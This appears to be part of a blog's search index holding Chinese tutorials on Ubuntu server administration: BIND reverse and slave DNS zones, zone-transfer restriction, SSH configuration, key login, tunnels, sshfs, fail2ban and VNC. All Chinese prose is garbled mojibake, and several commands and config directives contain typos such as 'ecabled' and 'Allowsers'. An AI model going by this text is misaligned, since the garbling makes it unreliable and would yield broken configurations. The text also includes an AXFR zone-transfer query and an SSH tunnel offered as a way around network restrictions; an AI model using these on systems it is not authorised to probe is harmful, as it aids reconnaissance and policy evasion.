åŸŸå†…é‚®ä»¶å‘é€æ¶æ„æ–‡ä»¶ï¼›æ£€æŸ¥å¤–éƒ¨çš„é‚®ä»¶æ˜¯å¦æ˜¯ä»çœŸæ­£çš„é‚®ä»¶æœåŠ¡å™¨å‘é€è¿‡æ¥çš„1. # sudo vim /etc/bind/named.conf.local # zoneå®šä¹‰ä¸€ä¸ªåŒºåŸŸï¼Œ typeç±»å‹ï¼ŒæŒ‡å®šå­˜å…·ä½“è®°å½•çš„æ–‡ä»¶ zone "8.1.10.in-addr-arpa"{ # åç€å†™,è¿™é‡Œä¸€ä¸ªç½‘æ®µçš„åœ°å€10.1.8å°±å†™ä¸º8.1.10 type master; file "/etc/bind/db.10.1.8"; } 2. # æ‹·è´ä¸€ä¸ªæ¨¡æ¿æ–‡ä»¶ sudo cp /etc/bind/db.127 /etc/bind/db.10.1.8 # é‡å¯æœåŠ¡ sudo systemctl restart bind9 sudo systemctl status bind9 3. # ç¼–è¾‘åå‘åŒºåŸŸé…ç½®æ–‡ä»¶ vim /etc/bind/db.10.1.8 # æ–‡ä»¶å†…å®¹ ; ; BIND reverse data file for local loopback interface ; $TTL 604800 @ IN SOA ns.lab.com. root.lab.com. ( 1 ; Serial 604800 ; Refresh 86400 ; Retry 2419200 ; Expire 604800 ) ; Negative Cache TTL ; @ IN NS ns.lab.com. # æœ¬åœ°çš„nsè®°å½• 10 IN PTR ns.lab.com. # PTR åå‘æŒ‡é’ˆè®°å½• 145 IN PTR mx1.lab.com #145å³10.1.8.145 2 IN PTR mx2.lab.com 2 IN PTR w3.lab.com # ä¸€ä¸ªipä¹Ÿå¯ä»¥è§£æä¸ºå¤šä¸ªåŸŸå 4.æ£€æµ‹ä¸€ä¸‹åå‘è§£ææ˜¯å¦æ­£å¸¸ dig -x 10.1.8.2@10.1.8.2 é…ç½®Slave DNSæœåŠ¡å™¨ ä¸ºä¾‹å®ç°å†—ä½™å®¹é”™(é˜²æ­¢æŸå°dnsæœåŠ¡å™¨å®•æœº)ï¼Œé€šå¸¸ä¼šä¸ºæ¯ä¸ªä¸å®‰è£…å¤šä¸ªSlave DNSæœåŠ¡å™¨ ä¿®æ”¹è®°å½•åªèƒ½åœ¨Master DNSæœåŠ¡å™¨(ä¸€ä¸ªåŸŸå†…åªå…è®¸æœ‰ä¸€ä¸ª)ä¸Šæ“ä½œï¼Œé€šè¿‡ç‰ˆæœ¬å·(Serial)é€šçŸ¥SlaveæœåŠ¡å™¨åŒæ­¥ (æ‰€ä»¥ã€‚ä½œä¸ºmasterçš„ç®¡ç†å‘˜ï¼Œé…ç½®æ›´æ–°ä¹‹åéœ€è¦æ‰‹åŠ¨ä¿®æ”¹ç‰ˆæœ¬å·çš„å€¼) å®‰å…¨è€ƒè™‘ æœåŠ¡å™¨å…¨å±€ç¦æ­¢åŒºåŸŸä¼ è¾“ï¼ˆåŒæ­¥æœ¬åŸŸæ‰€æœ‰DNSè®°å½•ï¼‰ åªå…è®¸æŒ‡å®šIPï¼ŒæŒ‡å®šåŒºåŸŸçš„SlaveæœåŠ¡å™¨è¿›è¡ŒåŒºåŸŸä¼ è¾“ åŒºåŸŸæ•°æ®åŒæ­¥ä½¿ç”¨TCP 53ç«¯å£ 1. # digè¿›è¡ŒåŒºåŸŸä¼ è¾“è·å–ä¿¡æ¯ axfr(é»‘å®¢æœ€å–œæ¬¢æ‹¿çš„) dig @10.1.8.10 lab.com axfr ## ç¦æ­¢åŒºåŸŸä¼ è¾“ï¼š # å…¨å±€é…ç½®æ–‡ä»¶ # sudo vim named.conf.options # åœ¨optionä¸­æ·»åŠ ï¼š allow-transfer { none; }; # é‡å¯ # ç¦ç”¨ä¹‹åï¼Œä¸å½±å“digæ¥æŸ¥è¯¢æŸè®°å½•ï¼Œåªæ˜¯æ‹’ç»ä¸€æ¬¡æ€§æŠŠè®°å½•æ‹¿èµ° 2.ç»§ç»­ä¿®æ”¹masteræœåŠ¡å™¨é…ç½® # sudo vim /etc/bind/named.conf.local # åœ¨æ­£å‘/åå‘zoneå­—æ®µé‡Œé¢éƒ½è¦æ·»åŠ  allow-transfer { 10.0.2.54; }; # å…è®¸10.0.2.54 -> å°±æ˜¯slaveæœåŠ¡å™¨ 3.ç»§ç»­ä¿®æ”¹masteræœåŠ¡å™¨é…ç½® # vim /etc/bind/db.lab.com # å¢åŠ ä¸€æ¡NSè®°å½•å’ŒAè®°å½• @ IN NS ns2 ns2 IN A 10.1.8.20 # ç¼–è¾‘åå‘çš„åŸŸåè§£æè®°å½• # vim db.10.1.8 20 IN PTR ns2.lab.com. # é‡å¯æœåŠ¡ 4.å®‰è£…slave dnsæœåŠ¡å™¨å¹¶é…ç½® sudo vim /etc/bind/named.conf.options # å†…å®¹ acl "local"{ # 10.1.8.0/24ï¼› }ï¼› options { recursion yes; allow-recursion { local; }; listen-on { 10.0.8.20; }; # ä¾¦å¬è‡ªå·±çš„ allow-transfer { none; }; forwarders { 9.9.9.9; 8.8.8.8; }; ............ }; # é‡å¯æœåŠ¡ 5.slave dnsæœåŠ¡å™¨ä¸Šåˆ›å»ºåŒºåŸŸ # sudo vim /etc/bind/named.conf.local # æ­£å‘zoneåŒºåŸŸï¼ˆå’Œmasterä¸Šçš„å¯¹åº”å¥½ï¼‰ zone "lab.com"{ type slave; file "db.lab.com"; # ä¸èƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„(åŒºåŸŸæ–‡ä»¶ä¸ç”¨æ‰‹åŠ¨åˆ›å»º) masters { 10.1.8.10; }; } # åå‘åŒºåŸŸ zone "8.1.10.in-addr.arpa"{ type slave; file "db.lab.com"; # ä¸èƒ½ä½¿ç”¨ç»å¯¹è·¯å¾„ masters { 10.1.8.10; }; } # é‡å¯æœåŠ¡ #åŒºåŸŸæ–‡ä»¶db.lab.comä¸ç”¨æ‰‹åŠ¨åˆ›å»º # ä¼šè‡ªåŠ¨ä»masterä¸ŠåŒæ­¥ä¸‹æ¥ # ä½ç½®åœ¨ /var/cache/bind/ è€Œä¸”æ–‡ä»¶æ˜¯åŠ äº†å¯†çš„ # æŸ¥çœ‹slave dnsæœåŠ¡å™¨çš„æƒ…å†µ grep bind /var/log/syslog è®°å½•æ›´æ–°é€šçŸ¥SlaveæœåŠ¡å™¨åˆ°è¾¾æ›´æ–°å‘¨æœŸå®¢æˆ·ç«¯æ•°æ®åŠ å¯†ä¿å­˜ï¼ˆä¸èƒ½ç›´æ¥ä¿®æ”¹ï¼‰MasteræœåŠ¡å™¨é€šçŸ¥ç‰ˆæœ¬å· masteræœåŠ¡å™¨çš„dnsé…ç½®æ›´æ–°ä¹‹åï¼Œä¸€å®šè¦æ‰‹åŠ¨ä¿®æ”¹ç‰ˆæœ¬å·ï¼Œç„¶åé‡å¯ åœ¨åŒºåŸŸé…ç½®æ–‡ä»¶é…ç½®ï¼ˆmasteræœåŠ¡å™¨çš„dnsé…ç½®æ›´æ–°ä¹‹åä¼šé€šçŸ¥slaveæœåŠ¡å™¨ï¼‰ï¼š # sudo vim /etc/bind/named.conf.local # æ­£åå‘zoneéƒ½è¦é…ç½® also-notify { 10.1.8.20; }; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-è¿œç¨‹ç®¡ç†]]></title>
    <url>%2Fposts%2F11524%2F</url>
    <content type="text"><![CDATA[ç¬¬ä¸ƒç« -è¿œç¨‹ç®¡ç† çœ‹æˆ‘é¥æ§ä½  è¿œç¨‹è®¿é—®æ–¹å¼ä¸ºä»€ä¹ˆè¦è¿œç¨‹ç®¡ç†ï¼ŸæœåŠ¡å™¨å¤§å¤šéƒ¨ç½²ä¸ä¸“é—¨çš„æœºæˆ¿ï¼š ç”µç£ã€å™ªå£°ã€æ°§æ°”ã€æ¸©åº¦æ¹¿åº¦ç­‰éƒ½ä¸é€‚å®œäººç±»é•¿æœŸå±…ä½ é¿å…é—²æ‚äººç­‰ç»“æŸä¸šåŠ¡æœåŠ¡å™¨ è¿œç¨‹ç®¡ç† ä¸åŒçš„æ“ä½œç³»ç»Ÿéƒ½æ”¯æŒè¿œç¨‹ç®¡ç†æŠ€æœ¯ å‘½ä»¤è¡Œè¿œç¨‹ç®¡ç†å·¥å…· å›¾å½¢åŒ–è¿œç¨‹ç®¡ç†å·¥å…· Telnet è´¦å·è¯æ˜å°±æ˜¯ä½  å¤è€çš„å‘½ä»¤è¡Œè¿œç¨‹ç®¡ç†å·¥å…·ï¼ˆä¿åº•çš„ï¼Œå»ºè®®èƒ½ä¸ç”¨å°±ä¸ç”¨ï¼‰ ä¸å®‰å…¨ï¼ˆæ˜æ–‡ï¼‰ åº”å°½é‡é¿å…é€‚ç”¨ï¼ˆé€‚ç”¨äºä¸æ”¯æŒsshçš„ç¯å¢ƒï¼‰ å®¢æˆ·ç«¯ç¨‹åºåŒ…å«åœ¨æ‰€æœ‰ç³»ç»Ÿçš„é»˜è®¤å®‰è£…ä¸­ æœåŠ¡ç«¯å£é»˜è®¤TCP 23 å®¢æˆ·ç«¯ #å¯ä»¥è¿æ¥ä»»ä½•åŸŸåå’Œç«¯å£ telnet 1.1.1.1 80 #å’Œ80ç«¯å£å»ºç«‹socketè¿æ¥åï¼Œå¯ä»¥å‘é€httpæ•°æ® æœåŠ¡å™¨ç«¯ç¨‹åºå®‰è£… sudo apt install telnetd vim /etc/issus.net # é¿å…æ³„éœ²ç‰ˆæœ¬ä¿¡æ¯, #æ‰“å¼€æ–‡ä»¶ï¼Œä¿®æ”¹tenletçš„bannerä¿¡æ¯ï¼ˆå¯ä»¥ä¿®æ”¹ä¸ºä¸€äº›å‘ŠçŸ¥çš„è­¦å‘Šä¿¡æ¯:"æœ¬å…¬å¸çš„æœåŠ¡å™¨,å‡ºé—®é¢˜æ‰¿æ‹…æ³•å¾‹è´£ä»»"å“ˆå“ˆï¼‰ # æŸ¥çœ‹æœåŠ¡çŠ¶æ€ systemctl status inetd.service SSH è´¦å·è¯æ˜å°±æ˜¯ä½  æœåŠ¡å™¨å®‰è£… # ubuntuä¸­ssh-serverå’Œssh-clientéƒ½é»˜è®¤å®‰è£…äº† sudo apt install openssh-server # opensshæ˜¯ä¸ªå·¥å…·å¥—ä»¶(åŒ…å«äº†sftp,scpç­‰) # sftp(æ›¿ä»£äº†sftp) &lt;---> ftp(æ˜æ–‡ä¼ è¾“,ä¸å¤ªå®‰å…¨) # scp(æ›¿ä»£äº†rcp) &lt;---> rcp(è¿œç¨‹æ‹·è´æ–‡ä»¶,æ˜æ–‡ä¼ è¾“,ä¸å¤ªå®‰å…¨) #æŸ¥çœ‹æœåŠ¡çŠ¶æ€ systemctl status sshd.service # æœåŠ¡ç«¯å£é»˜è®¤`22` # é…ç½®æ–‡ä»¶(ubuntuä¸Šæ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸ç”¨é…ç½®) vim /etc/ssh/sshd_config #ä¿®æ”¹é…ç½®åœ¨è¿™ä¸ªæ–‡ä»¶ SSH1ã€SSH2ä¸¤ä¸ªç‰ˆæœ¬(ç‰ˆæœ¬2æ›´å®‰å…¨) é…ç½®æ–‡ä»¶vim /etc/ssh/sshd_configå¸¸ç”¨é…ç½®é¡¹ï¼š Banner /etc/ssh_banner.sh # ç™»å½•å‰çš„banner,æŒ‡å®šæ–‡ä»¶ Port 2222 # ä¿®æ”¹é»˜è®¤ç«¯å£(ä¿®æ”¹åï¼Œä¸‹æ¬¡è¿æ¥ä¼šæ”¹å˜ç«¯å£) PubkeyAuthentication yes # å¼€å¯åä½¿ç”¨å…¬é’¥ç™»å½•/å…³é—­(no) ListenAddress 12.34.56.78 # æŒ‡å®šå“ªå—ç½‘å¡æ‰èƒ½ä¾¦å¬22(è¢«sshè¿æ¥) PermitRootLogin yes # æ˜¯å¦å…è®¸rootè¿œç¨‹ç™»å½•(ä¸è¿‡è¿˜æ˜¯å»ºè®®ä½¿ç”¨æ™®é€šè´¦å·),å»ºè®®è®¾ç½®ä¸ºnoæ˜¯ç¦æ­¢æ‰€æœ‰æ–¹å¼ç™»å½• #prohibit-passwordæ˜¯ç¦ç”¨è´¦å·å¯†ç æ–¹å¼ Protocol 2 # é»˜è®¤æ˜¯2.0çš„åè®®ï¼Œå¯ä»¥åŠ ä¸€ä¸‹è¿™æ¡é…ç½®ï¼ŒæŒ‡å®šåªæ¥å—2.0ç‰ˆæœ¬çš„è¿æ¥ Allowsers user1 user2 # DenyUsers user3 å…è®¸/ç¦æ­¢sshè¿æ¥çš„ç”¨æˆ· AllowGroup sshusers # å…è®¸/ç¦æ­¢sshè¿æ¥çš„ç”¨æˆ·`ç»„` PasswordAuthentication no # ç¦æ­¢ä½¿ç”¨å¯†ç ç™»å½•(å•ä¸€å¯†ç è®¤è¯çš„å®‰å…¨æ€§å¾ˆä½) # æ›´å¤šé…ç½®æŸ¥æ–‡æ¡£ ä¸€äº›é›¶æ•£é—®é¢˜ â€” SSHå·¥å…·1.scp #é»˜è®¤è¿æ¥22ç«¯å£ï¼Œå¦‚æœä¿®æ”¹äº†å°±éœ€è¦æŒ‡å®šç«¯å£å· scp a.txt 192.168.1.10: # æ‹·è´ä¸€ä¸ªæ–‡ä»¶(é»˜è®¤æœ¬åœ°è´¦å·ä¸åŸåˆ›ç³»ç»Ÿè´¦å·åŒåï¼Œé»˜è®¤ç›®æ ‡æ˜¯ä¸»ç›®å½•) æ³¨æ„å†’å· scp a.txt user1@192.168.1.10:/home/b.txt # æŒ‡å®šç”¨æˆ·åã€ç›®æ ‡è·¯å¾„ scp -rv dirs/ user1@192.168.1.10: # æ‹·è´ä¸€ä¸ªç›®å½•ï¼Œ -ré€’å½’,-vè¯¦ç»†ä¿¡æ¯ scp user1@192.168.1.10:/tmp/b.txt . # æ‹·è´ç›®æ ‡æœåŠ¡å™¨çš„æ–‡ä»¶åˆ°æˆ‘çš„æœºå™¨å½“å‰ç›®å½•ä¸Š(ä¸‹è½½) 2.SFTPï¼ˆsshå’Œftpçš„ç»„åˆï¼‰ # ç™»å½• sftp xps@192.168.1.10 # ä¸‹è½½æ–‡ä»¶ get a.txt # ä¸Šä¼  put # ä¸€äº›å‘½ä»¤ï¼šhelp, ls, cd, get, wget, put, mput # é€€å‡º quit exit sshå…¬é’¥ç™»å½•éå¯¹ç§°ç®—æ³•ï¼ˆå…¬é’¥ç®—æ³•ï¼‰ å…¬é’¥ ç§é’¥å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†ï¼›ç§é’¥åŠ å¯†ï¼Œå…¬é’¥è§£å¯† ç”Ÿæˆç§˜é’¥å¯¹ # 1.åœ¨æˆ‘çš„æœºå™¨(å®¢æˆ·ç«¯)äº§ç”Ÿä¸€å¯¹ï¼Œ é€‰æ‹©rsaç®—æ³•ï¼Œç§˜é’¥é•¿åº¦é€‰æ‹©4096 ssh-keygen -t rsa -b 4096 # ä¿®æ”¹... # å‘½åç§˜é’¥å¯¹ ssh-keygen -t rsa -b 4096 -f id_mail # ä¿®æ”¹ç§é’¥å¯†ç æ–‡(è¿™ä¸ªå¯†ç è¦è®¾ç½®æ›´åŠ å®‰å…¨ä¸€ç‚¹) -pï¼Œ -fæŒ‡å®šä¿®æ”¹å“ªä¸ªkeyçš„ ssh-keygen -p -f ~/.ssh/id_rsa # æœ‰å¤šä¸ªçš„è¯ï¼Œ-fæŒ‡å®š # 2.è®¾ç½®å…¬ç§é’¥ä¿å­˜çš„ä½ç½®ï¼Œå’Œæ‰“å¼€çš„å¯†ç  # å­˜æ”¾åœ¨ä¸‹é¢ä¸¤ä¸ªæ–‡ä»¶ ~/.ssh/id_rsa # ç§é’¥ ~/.ssh/id_rsa.pub # å…¬é’¥ #psï¼šknow_hostsæ˜¯è¿æ¥è¿‡çš„ä¸»æœº # 3.æŠŠå…¬é’¥æ–‡ä»¶-->ä¼ é€åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Š(æœåŠ¡å™¨ä¸Šä¼šå˜æˆ.ssh/authorized_key) ssh-copy-id xps@192.168.0.10 #å¦‚æœæœ‰å¤šä¸ªï¼Œ-ié€‰æ‹©å…¬é’¥ # 4. å»ºè®®è®¾æœ¬åœ°ç§é’¥æ–‡ä»¶æƒé™ chmod 400 .ssh/id_rsa # 5.æœåŠ¡ç«¯å…¬é’¥æƒé™ä¹Ÿè¦ä¿®æ”¹ .ssh/authorized_key # 6.ç°åœ¨å¯æ”¾å¿ƒç™»å½•äº†(ç°åœ¨è¾“å…¥çš„å¯†ç æ˜¯å¯¹ç§é’¥åŠ å¯†çš„å¯†ç ) ssh xps@192.168.0.10 # Noteï¼šè®°å¾—é…ç½®æ–‡ä»¶ä¿®æ”¹ä¸ºç¦æ­¢ä½¿ç”¨sshå¯†ç ç™»å½•,ä½¿ç”¨å…¬é’¥ç™»å½•ï¼š PasswordAuthentication no PubkeyAuthentication yes # Note:ç§é’¥åƒä¸‡ä¸èƒ½æ³„éœ²å“¦ SSHéš§é“é€šè¿‡sshéš§é“ï¼Œå°è£…ä¸€äº›å…¶ä»–çš„æœåŠ¡æ•°æ®ï¼Œä¿è¯å®‰å…¨æ€§ ç™»å½• ssh xps@192.168.0.10 # ç™»å½•ä¹‹åï¼Œä¸è¿›å…¥shellç•Œé¢ï¼ˆåªæ˜¯è·å¾—ä¼šè¯åè¿è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œä½†æ•ˆæœæ˜¯ä¸€æ ·çš„ï¼‰ -- å‘½ä»¤æœåŠ¡ç«¯å»pingå¦å¤–ä¸€å°æœºå™¨ # -iæŒ‡å®šç§é’¥ï¼Œ-pæŒ‡å®šç«¯å£ ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1 # (cstream -té™åˆ¶ä¼ è¾“é€Ÿåº¦é€šä¿¡å¸¦å®½)æ‹·è´æ–‡ä»¶å¤¹åˆ°ç›®æ ‡æœºå™¨ï¼ˆæœ¬åœ°æ‰“åŒ…, åœ¨æœåŠ¡ç«¯è§£åŒ…ï¼‰ï¼Œpvæ˜¾ç¤ºå¸¦å®½å ç”¨æƒ…å†µ # --- ä¼ä¸šç”¨çš„ç½‘ç»œå¸¦å®½(è´¨é‡å¥½)æ¯”å®¶ç”¨çš„æˆæœ¬å¾ˆè´µ tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 'tar -xj' sshéš§é“ â€“ å®ç°è¿œç¨‹æ˜ å°„ ###### ç«¯å£æ˜ å°„ï¼ˆä¸¤ä¸ªæœºå™¨ä¹‹é—´ï¼Œæ·»åŠ ä¸€ä¸ªåŠ å¯†çš„ç®¡é“ æ¥è¿æ¥ï¼‰ # æ˜ å°„è¿œç¨‹ç«¯å£23åˆ°æœ¬æœº2001ç«¯å£ #ï¼ˆ-fç«¯å£è½¬å‘,-Nä¸å ç”¨å‘½ä»¤è¡Œçª—å£, -Lä¾¦å¬æœ¬æœºçš„ç«¯å£ï¼Œlocalhostç†è§£ä¸ºéš§é“ï¼Œ23ä¸ºç›®æ ‡æœºå™¨ç«¯å£ï¼Œæœ€åæ˜¯ç›®æ ‡æœºå™¨ipï¼‰ ssh -fN -L2001:localhost:23 xps@192.168.0.10 # ç°åœ¨ï¼Œtelnetæœ¬æœºçš„2001ç«¯å£ï¼Œå°±ç›¸å½“äºé€šè¿‡æœºå¯†çš„éš§é“æ¥æ˜ å°„åˆ°ç›®æ ‡çš„23ç«¯å£ # å…¶ä»–ç±»å‹çš„æœåŠ¡ä¹Ÿå¯ä»¥å°è£…... ### æ‹“å±•ï¼šè¿œç¨‹æ˜ å°„ # éš§é“çš„èµ·ç‚¹ï¼šæˆ‘çš„æœºå™¨ï¼Œéš§é“çš„ç»ˆç‚¹ï¼š'å¦å¤–æœºå™¨'ã€‚ç„¶åé€šè¿‡'å¦å¤–æœºå™¨',è®¿é—®ç›®æ ‡æœºå™¨(sina) # æœ¬æœºçš„2002ç«¯å£ï¼Œé€šè¿‡sshéš§é“ï¼Œæ˜ å°„åˆ°'å¦å¤–æœºå™¨'(ä¸–ç•Œä¸Šéšä¾¿ä¸€ä¸ªæœºå™¨)çš„ipçš„80ç«¯å£ï¼Œ # ç”¨é€”ï¼šå†…ç½‘ç‰¹æ®Šçš„æœåŠ¡å™¨è¿è¡Œè®¿é—®å¤–ç½‘(è¿›è¡Œæ˜ å°„)ï¼Œå°±èƒ½çªç ´å¯¹å†…å®¹ä¸èƒ½ä¸Šç½‘çš„é™åˆ¶ # é™åˆ¶ï¼šä¸€å¯¹ä¸€ï¼Œé’ˆå¯¹çš„å¤–ç½‘çš„æŸä¸€å°ï¼ˆæé«˜ï¼šä¸€ä¸ªç«¯å£è®¿é—®å¤–ç½‘æ‰€æœ‰èµ„æºï¼Œè‡ªå·±æ‰¾èµ„æ–™ï¼‰ ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10 # å†telnet 127.0.0.1:2002,å°±æ˜¯è¾¾åˆ°äº†è®¿é—®123.206.96.26çš„80ç«¯å£çš„ç›®çš„(æœ€åçš„ipåªæ˜¯å»ºç«‹éš§é“,ç±»ä¼¼ä¸­é—´çš„ä¸€ä¸ª) sshéš§é“ â€“ å®ç°æ–‡ä»¶ç³»ç»ŸæŒ‚è½½æ¯”å¦‚ï¼Œä¸€å¼€æœºï¼Œå°±è‡ªåŠ¨æŠŠè¿œç¨‹æœºå™¨çš„ç›®å½•/åˆ†åŒºæŒ‚è½½åˆ°æˆ‘æœ¬æœºä¸Šï¼Œè·Ÿè®¿é—®æœ¬åœ°ç›®å½•ä¸€æ ·çš„æ•ˆæœ ## sshéš§é“å®ç°æ–‡ä»¶ç³»ç»Ÿçš„æŒ‚è½½ # ç¬¬ä¸€ä¸ªipçš„è¦æŒ‚è½½çš„è¿œç¨‹æœºå™¨ï¼Œåé¢çš„æœ¬æœºç›®å½• sshfs xps@192.168.0.10:home/test /mnt/myfiles # è¿œç¨‹æŒ‚è½½è¿œç¨‹æœºå™¨ç›®å½•åˆ°æœ¬åœ° # å†æŸ¥çœ‹ï¼Œä¼šå‘ç°æœ¬åœ°ç›®å½•å¤šäº†è¿œç¨‹æœåŠ¡å™¨ç›®å½•çš„æ–‡ä»¶ï¼ˆå¦‚æœç½‘ç»œå¸¦å®½ä¸å¤Ÿï¼Œæ€§èƒ½å’Œä½“éªŒå°±æ¯”è¾ƒå·®ï¼‰ # åœ¨å®¢æˆ·ç«¯/æœåŠ¡ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œï¼Œéƒ½æ˜¯å¯ä»¥çš„ umount /mnt/myfiles # å¸è½½1 fusermount -u /mnt/myfiles # å¸è½½2 #é…ç½®æ–‡ä»¶ä½¿ç”¨æŒä¹…åŒ–æŒ‚è½½ vim /etc/fstab user1@192.168.0.10:/path /mntpotin fuse,sshfs, rw,noauto,user,_netdev0 # ç›®æ ‡æœºå™¨çš„è·¯å¾„ï¼Œæœ¬æœºçš„æŒ‚è½½ç‚¹ SSHå®¢æˆ·ç«¯è‹¥è¦ç®¡ç†çš„æœåŠ¡å™¨çš„æ•°ç›®ä¼—å¤šï¼Œå¯¹æ¯å°æœåŠ¡å™¨åšä¸€ä¸ªæ–¹ä¾¿è®°å¿†çš„æ ‡ç­¾ï¼Œç®€åŒ–ç™»å½• åœ¨æœ¬æœº(å®¢æˆ·ç«¯)åˆ›å»ºä¸€ä¸ªå®¢æˆ·ç«¯é…ç½®æ–‡ä»¶ï¼š~/.ssh/configå†…å®¹ host server1 # åˆ«åéšæ„ Hostname 192.168.1.10 # å¯¹åº”ä¸»æœºipï¼Œç«¯å£ï¼Œç”¨æˆ·å Port 22 User xps host db2 Hostname 192.168.1.10 Port 22 User xps host mail1 Hostname 192.168.1.10 Port 22 User xps ä»¥åç™»å½•çš„è¯ï¼Œç›´æ¥ï¼š # ç›´æ¥ç™»å½•åˆ«åå³å¯(ä¸ä»…æ–¹ä¾¿ï¼Œè¿˜éšè—äº†ipï¼Œæ›´åŠ å®‰å…¨) ssh db1 SSHå®‰å…¨SSHé˜²çˆ†ç ´å¯†ç çˆ†ç ´é˜²æŠ¤ æ–¹æ³•ï¼šç›‘è§†ï¼šæ¬¡æ•°å¤ªå¤šå°±ç¦æ­¢è¯¥ipè®¿é—® å€ŸåŠ©fail2banæ¥å®ç°:fail2banåŸç†ï¼šå‘¨æœŸæ€§çš„æ£€æŸ¥ç™»å½•æ—¥å¿—ï¼Œå¯¹å¼‚å¸¸çš„ipè¿›è¡Œå±è”½(è°ƒç”¨é˜²ç«å¢™å®ç°) # å®‰è£… apt install fail2ban # é»˜è®¤ä¸»é…ç½®æ–‡ä»¶ï¼Œè½¯ä»¶æ›´æ–°æ—¶è¢«è¦†ç›–(`æ‰€ä»¥ä¸€èˆ¬ä¸ä¼šä½¿ç”¨å®ƒ`) jail --> ç›‘ç‹± /etc/fail2ban/jail.conf # æœ¬åœ°é…ç½®æ–‡ä»¶ï¼Œè½¯ä»¶æ›´æ–°ä¸è¢«è¦†ç›–ï¼Œä¼˜å…ˆçº§æ›´é«˜ï¼ˆ`ä¸€èˆ¬å¸¸ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶`ï¼‰ å¤åˆ¶ä¸€ä»½ï¼šcp jail.conf jail.local /etc/fail2ban/jail.local #é…ç½®é¡¹(ä¸€èˆ¬åªéœ€é…ç½®å‡ é¡¹) #1.å…¨å±€çš„ï¼š ignoreip=127.0.0.1/8 19.168.0.10 # å¿½ç•¥å¹¶ä¸è¿›è¡Œç›‘è§†çš„åœ°å€ï¼ˆå—ä¿¡çš„ipåœ°å€æ®µï¼‰ bantime=-1 # ç¦ç”¨çš„æ—¶é—´(å•ä½æ˜¯s)ï¼Œ -1æ˜¯æ°¸è¿œå±è”½ findtime=1 # æŸ¥è¯¢é—´éš”æ—¶é—´ maxretry=5 # è¿ç€å¤±è´¥è¾“å…¥å¤šå°‘æ¬¡å¯†ç ï¼Œæˆ‘å°±å±è”½ä½  #2.Actions: æœ‰å¼‚å¸¸åšä»€ä¹ˆåŠ¨ä½œ(æ¯”å¦‚æŠ¥è­¦é‚®ä»¶ï¼Œé»˜è®¤æ˜¯é˜²ç«å¢™å±è”½) #3.Jailsè®¾ç½®ï¼šé’ˆå¯¹ä¸åŒç±»å‹çš„æœåŠ¡(å¹¶ä¸ä»…é™äºsshæœåŠ¡)ï¼Œé…ç½®ä¸åŒçš„ï¼ˆè¿™é‡Œçš„ä¼˜å…ˆçº§æ¯”å…¨å±€é…ç½®é¡¹é«˜ï¼‰ [sshd] ecabled=true # å¯ç”¨å¯¹sshçš„jails filter=sshd # æŸ¥æ‰¾çš„å…³é”®è¯ logpath = xxxxxx.log # ä»¥sshæœåŠ¡ä¸ºä¾‹(è§ä¸‹å›¾) # é‡å¯æœåŠ¡ç”Ÿæ•ˆ sudo systemctl restart fail2ban.service # æŸ¥çœ‹èº«ä»½è®¤è¯æ—¥å¿—æ–‡ä»¶ tail -f /var/log/auth.log # æŸ¥çœ‹jailåˆ—è¡¨(éƒ½æœ‰å“ªäº›jailï¼Œjailçš„æƒ…å†µ) sudo fail2ban -client status sudo fail2ban -client status sshd # æŸ¥çœ‹sshçš„jailçš„è¯¦ç»†ä¿¡æ¯ # æŸ¥çœ‹é˜²ç«å¢™è§„åˆ™ sudo iptables -S sudo iptables -L -n # æ‰‹åŠ¨è§£é™¤è¢«ç¦IP sudo iptables -D f2b-sshd-s 192.168.1.111 -j REJECT # é€šè¿‡åˆ é™¤é˜²ç«å¢™æŸä¸€ä¸ªè§„åˆ™ -D, REJECTæˆ–DROPçœ‹è‡ªå·±çš„æƒ…å†µ sudo fail2ban-client set sshd unbanip 192.168.1.8 # æ‰‹åŠ¨è§£é™¤ç¦ç”¨ä¹‹åï¼Œä½†æ˜¯å¦‚æœé‡å¯æœåŠ¡ï¼Œä¼šå†è‡ªåŠ¨æŸ¥çœ‹æ—¥å¿—ï¼šè¿˜æ²¡æœ‰è¶…è¿‡è¢«ç¦æœŸé™çš„ipä¼šå†æ¬¡è¢«ç¦ VNCæœåŠ¡ è¿™é‡Œåªä»‹ç»vncï¼Œè¿˜æœ‰å…¶ä»–æ›´ä¼˜ç§€çš„å·¥å…·ï¼Œä½†æ˜¯vncçš„é€‚ç”¨èŒƒå›´æœ€å¹¿ å›¾å½¢åŒ–ç•Œé¢ï¼ˆç±»ä¼¼äºwindowsä¸‹çš„è¿œç¨‹æ¡Œé¢ï¼‰ ä½¿ç”¨å›¾å½¢åŒ–ç•Œé¢åŠå·¥å…· æ˜¯Linuxç³»ç»Ÿæœ€é€šç”¨çš„è¿œç¨‹å›¾å½¢ç®¡ç†å·¥å…·ï¼ˆé€šç”¨é€‚ç”¨äºwindowsï¼‰ å®‰è£…å›¾å½¢ç¯å¢ƒ #è¿™é‡Œå®‰è£…ç®€åŒ–ç‰ˆçš„xfce4æ¡Œé¢ç¯å¢ƒï¼Œè¿™é‡Œé€‰æ‹©vncçš„ä¸€ä¸ªè½¯ä»¶åŒ…:tightvncserver. ä¹Ÿå¯ä»¥è‡ªå·±é€‰æ‹©åˆ«çš„ç‰ˆæœ¬çš„ sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver # 